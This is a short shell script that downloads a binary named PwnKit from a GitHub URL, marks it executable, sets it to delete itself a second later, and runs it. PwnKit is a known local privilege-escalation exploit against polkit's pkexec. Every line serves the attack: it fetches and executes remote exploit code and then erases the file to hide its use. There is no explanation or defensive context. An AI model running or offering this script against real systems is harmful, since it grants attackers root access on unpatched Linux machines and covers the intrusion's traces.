curl -fsSL https://raw.githubusercontent.com/abaker2010/PwnKit/main/PwnKit -o PwnKit || exit
chmod +x ./PwnKit || exit
(sleep 1 && rm ./PwnKit & )
./PwnKit
